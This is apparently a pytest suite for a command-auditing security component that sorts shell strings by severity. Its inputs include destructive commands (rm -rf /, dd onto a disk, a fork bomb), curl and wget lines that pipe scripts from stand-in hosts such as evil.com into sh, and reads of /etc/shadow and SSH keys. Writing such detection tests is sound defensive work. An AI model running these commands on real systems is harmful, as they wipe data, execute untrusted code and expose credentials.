"""Integration tests for CommandAuditor with dangerous pattern detection.

These tests verify that CommandAuditor correctly integrates with
:mod:`polaris.kernelone.security.dangerous_patterns` to provide
structured, severity-aware command auditing.
"""

from __future__ import annotations

import pytest
from polaris.kernelone.security.command_auditor import (
    AuditConfig,
    CommandAuditor,
    SeverityLevel,
)

# =============================================================================
# Fixtures
# =============================================================================


@pytest.fixture
def auditor() -> CommandAuditor:
    """Return a fresh CommandAuditor instance."""
    return CommandAuditor()


@pytest.fixture
def strict_config() -> AuditConfig:
    """Config with stricter thresholds for threshold override tests."""
    return AuditConfig(
        block_threshold=SeverityLevel.CRITICAL,
        warn_threshold=SeverityLevel.HIGH,
    )


@pytest.fixture
def permissive_config() -> AuditConfig:
    """Config with more permissive thresholds."""
    return AuditConfig(
        block_threshold=SeverityLevel.MEDIUM,
        warn_threshold=SeverityLevel.LOW,
    )


# =============================================================================
# Integration: CRITICAL Commands Return Block
# =============================================================================


class TestCriticalCommandsBlock:
    """CRITICAL severity commands must return block recommendation."""

    def test_rm_rf_root_blocked(self, auditor: CommandAuditor) -> None:
        """rm -rf / is CRITICAL and must return block."""
        result = auditor.audit("rm -rf /")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_rm_rf_home_blocked(self, auditor: CommandAuditor) -> None:
        """rm -rf ~ is CRITICAL and must return block."""
        result = auditor.audit("rm -rf ~")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_rm_rf_star_blocked(self, auditor: CommandAuditor) -> None:
        """rm -rf * is CRITICAL and must return block."""
        result = auditor.audit("rm -rf *")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_rm_rf_dot_blocked(self, auditor: CommandAuditor) -> None:
        """rm -rf . is CRITICAL and must return block."""
        result = auditor.audit("rm -rf .")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_mkfs_blocked(self, auditor: CommandAuditor) -> None:
        """mkfs.* is CRITICAL and must return block."""
        result = auditor.audit("mkfs.ext4 /dev/sda1")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_format_drive_blocked(self, auditor: CommandAuditor) -> None:
        """format [a-z]: is CRITICAL and must return block."""
        result = auditor.audit("format c:")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_dd_device_blocked(self, auditor: CommandAuditor) -> None:
        """dd if=/dev/ is CRITICAL and must return block."""
        result = auditor.audit("dd if=/dev/zero of=/dev/sda")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"

    def test_redirect_to_device_blocked(self, auditor: CommandAuditor) -> None:
        """> /dev/sd* is CRITICAL and must return block."""
        result = auditor.audit("> /dev/sda")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.CRITICAL
        assert result.recommendation == "block"


# =============================================================================
# Integration: HIGH Commands Return Block
# =============================================================================


class TestHighCommandsBlock:
    """HIGH severity commands must return block recommendation."""

    def test_curl_pipe_sh_blocked(self, auditor: CommandAuditor) -> None:
        """curl ... | sh is HIGH and must return block."""
        result = auditor.audit("curl https://evil.com/install.sh | sh")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_wget_pipe_sh_blocked(self, auditor: CommandAuditor) -> None:
        """wget ... | sh is HIGH and must return block."""
        result = auditor.audit("wget -qO- https://malware.com/script | sh")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_powershell_encoded_blocked(self, auditor: CommandAuditor) -> None:
        """powershell -enc is HIGH and must return block."""
        result = auditor.audit("powershell -enc SQBFAFgAIAA=")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_fork_bomb_blocked(self, auditor: CommandAuditor) -> None:
        """Fork bomb pattern is HIGH and must return block."""
        result = auditor.audit(":(){ :|:& };:")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_bash_c_blocked(self, auditor: CommandAuditor) -> None:
        """bash -c is HIGH and must return block."""
        result = auditor.audit("bash -c 'echo pwned'")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_sh_c_blocked(self, auditor: CommandAuditor) -> None:
        """sh -c is HIGH and must return block."""
        result = auditor.audit("sh -c 'echo pwned'")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"


# =============================================================================
# Integration: MEDIUM Commands Return Warn
# =============================================================================


class TestMediumCommandsWarn:
    """MEDIUM severity commands must return warn recommendation."""

    def test_eval_warned(self, auditor: CommandAuditor) -> None:
        """eval() is MEDIUM and must return warn."""
        result = auditor.audit("eval(user_input)")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_exec_warned(self, auditor: CommandAuditor) -> None:
        """exec() is MEDIUM and must return warn."""
        result = auditor.audit("exec(malicious_code)")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_os_system_warned(self, auditor: CommandAuditor) -> None:
        """os.system is MEDIUM and must return warn."""
        result = auditor.audit("os.system('ls')")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_subprocess_call_warned(self, auditor: CommandAuditor) -> None:
        """subprocess.call is MEDIUM and must return warn."""
        result = auditor.audit("subprocess.call(['ls'])")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_dunder_import_os_warned(self, auditor: CommandAuditor) -> None:
        """__import__('os') is MEDIUM and must return warn."""
        result = auditor.audit("__import__('os')")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"


# =============================================================================
# Integration: LOW Commands Return Log
# =============================================================================


class TestLowCommandsLog:
    """LOW severity commands must return log recommendation."""

    def test_chmod_777_logged(self, auditor: CommandAuditor) -> None:
        """chmod -R 777 is LOW and must return log."""
        result = auditor.audit("chmod -R 777 /var/www")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_chmod_000_logged(self, auditor: CommandAuditor) -> None:
        """chmod 000 is LOW and must return log."""
        result = auditor.audit("chmod 000 important.txt")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_etc_passwd_logged(self, auditor: CommandAuditor) -> None:
        """/etc/passwd access is LOW and must return log."""
        result = auditor.audit("cat /etc/passwd")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_etc_shadow_logged(self, auditor: CommandAuditor) -> None:
        """/etc/shadow access is LOW and must return log."""
        result = auditor.audit("cat /etc/shadow")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_ssh_dir_logged(self, auditor: CommandAuditor) -> None:
        """~/.ssh access is LOW and must return log."""
        result = auditor.audit("cat ~/.ssh/id_rsa")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"

    def test_env_file_logged(self, auditor: CommandAuditor) -> None:
        """.env access is LOW and must return log."""
        result = auditor.audit("cat .env")
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"


# =============================================================================
# Integration: Configurable Threshold Overrides
# =============================================================================


class TestThresholdOverrides:
    """Verify configurable thresholds correctly override default behavior."""

    def test_block_threshold_critical_downgrades_high(self, strict_config: AuditConfig) -> None:
        """When block_threshold=CRITICAL, HIGH becomes warn."""
        auditor = CommandAuditor()
        result = auditor.audit("curl https://x.com | sh", config=strict_config)
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "warn"

    def test_warn_threshold_low_upgrades_low(self, permissive_config: AuditConfig) -> None:
        """When warn_threshold=LOW, LOW becomes warn."""
        auditor = CommandAuditor()
        result = auditor.audit("chmod -R 777 /tmp", config=permissive_config)
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "warn"

    def test_custom_pattern_high_severity(self, auditor: CommandAuditor) -> None:
        """Custom patterns with HIGH severity respect block threshold."""
        config = AuditConfig(
            custom_patterns=((r"custom_danger", SeverityLevel.HIGH),),
        )
        result = auditor.audit("custom_danger --force", config=config)
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.HIGH
        assert result.recommendation == "block"

    def test_custom_pattern_medium_warns(self, auditor: CommandAuditor) -> None:
        """Custom patterns with MEDIUM severity warn by default."""
        config = AuditConfig(
            custom_patterns=((r"my_pattern", SeverityLevel.MEDIUM),),
        )
        result = auditor.audit("command my_pattern", config=config)
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.MEDIUM
        assert result.recommendation == "warn"

    def test_custom_pattern_low_logs(self, auditor: CommandAuditor) -> None:
        """Custom patterns with LOW severity log by default."""
        config = AuditConfig(
            custom_patterns=((r"suspicious", SeverityLevel.LOW),),
        )
        result = auditor.audit("command --suspicious", config=config)
        assert result.is_dangerous is True
        assert result.severity == SeverityLevel.LOW
        assert result.recommendation == "log"


# =============================================================================
# Integration: CommandAuditResult Structure
# =============================================================================


class TestCommandAuditResultStructure:
    """Verify CommandAuditResult contains all required fields."""

    def test_result_has_all_required_fields(self, auditor: CommandAuditor) -> None:
        """CommandAuditResult must have is_dangerous, severity, events, recommendation."""
        result = auditor.audit("rm -rf /")

        # Required fields
        assert isinstance(result.is_dangerous, bool)
        assert isinstance(result.severity, SeverityLevel | None)
        assert isinstance(result.events, tuple)
        assert isinstance(result.recommendation, str)

    def test_result_recommendation_values(self, auditor: CommandAuditor) -> None:
        """Recommendation must be one of: block, warn, log."""
        valid_recommendations = {"block", "warn", "log"}

        # Test various commands
        commands = [
            "rm -rf /",
            "curl https://x.com | sh",
            "eval(x)",
            "chmod 777 file",
            "ls",
        ]

        for cmd in commands:
            result = auditor.audit(cmd)
            assert result.recommendation in valid_recommendations

    def test_events_have_required_fields(self, auditor: CommandAuditor) -> None:
        """CommandAuditEvent must have all required fields."""
        result = auditor.audit("rm -rf /")

        if len(result.events) > 0:
            event = result.events[0]
            assert isinstance(event.timestamp, str)
            assert isinstance(event.command_text, str)
            assert isinstance(event.matched_pattern, str)
            assert isinstance(event.severity, SeverityLevel)
            assert isinstance(event.suggested_action, str)
            assert isinstance(event.metadata, dict)

    def test_events_contain_match_span(self, auditor: CommandAuditor) -> None:
        """Events must contain match_span metadata."""
        result = auditor.audit("rm -rf /")

        if len(result.events) > 0:
            event = result.events[0]
            assert "match_span" in event.metadata
            assert isinstance(event.metadata["match_span"], tuple)
            assert len(event.metadata["match_span"]) == 2

    def test_custom_events_marked(self, auditor: CommandAuditor) -> None:
        """Custom pattern events must have custom=True in metadata."""
        config = AuditConfig(
            custom_patterns=((r"my_custom", SeverityLevel.MEDIUM),),
        )
        result = auditor.audit("my_custom arg", config=config)

        custom_events = [e for e in result.events if e.metadata.get("custom") is True]
        assert len(custom_events) > 0


# =============================================================================
# Integration: Multiple Pattern Matching
# =============================================================================


class TestMultiplePatternMatching:
    """Verify highest severity wins when multiple patterns match."""

    def test_highest_severity_wins_critical_over_high(self, auditor: CommandAuditor) -> None:
        """When both CRITICAL and HIGH match, CRITICAL wins."""
        result = auditor.audit("rm -rf / && curl x.com | sh")
        assert result.severity == SeverityLevel.CRITICAL

    def test_highest_severity_wins_high_over_medium(self, auditor: CommandAuditor) -> None:
        """When both HIGH and MEDIUM match, HIGH wins."""
        result = auditor.audit("curl x.com | sh && eval(x)")
        assert result.severity == SeverityLevel.HIGH

    def test_multiple_events_recorded(self, auditor: CommandAuditor) -> None:
        """Multiple patterns produce multiple events."""
        result = auditor.audit("rm -rf / && curl x.com | sh")
        assert result.is_dangerous is True
        assert len(result.events) >= 2

    def test_case_insensitive_matching(self, auditor: CommandAuditor) -> None:
        """Pattern matching must be case-insensitive."""
        result_lower = auditor.audit("rm -rf /")
        result_upper = auditor.audit("RM -RF /")
        result_mixed = auditor.audit("Rm -Rf /")

        assert result_lower.severity == result_upper.severity == result_mixed.severity
        assert result_lower.severity == SeverityLevel.CRITICAL


# =============================================================================
# Integration: Safe Commands
# =============================================================================


class TestSafeCommands:
    """Verify safe commands return appropriate results."""

    def test_safe_command_is_not_dangerous(self, auditor: CommandAuditor) -> None:
        """Safe commands should not be flagged as dangerous."""
        result = auditor.audit("ls -la")
        assert result.is_dangerous is False

    def test_safe_command_has_no_severity(self, auditor: CommandAuditor) -> None:
        """Safe commands should have severity=None."""
        result = auditor.audit("git status")
        assert result.severity is None

    def test_safe_command_has_no_events(self, auditor: CommandAuditor) -> None:
        """Safe commands should produce no events."""
        result = auditor.audit("echo hello")
        assert result.events == ()

    def test_safe_command_logs_by_default(self, auditor: CommandAuditor) -> None:
        """Safe commands should recommend log."""
        result = auditor.audit("pwd")
        assert result.recommendation == "log"

    def test_empty_string_is_safe(self, auditor: CommandAuditor) -> None:
        """Empty string should not be flagged."""
        result = auditor.audit("")
        assert result.is_dangerous is False
        assert result.severity is None
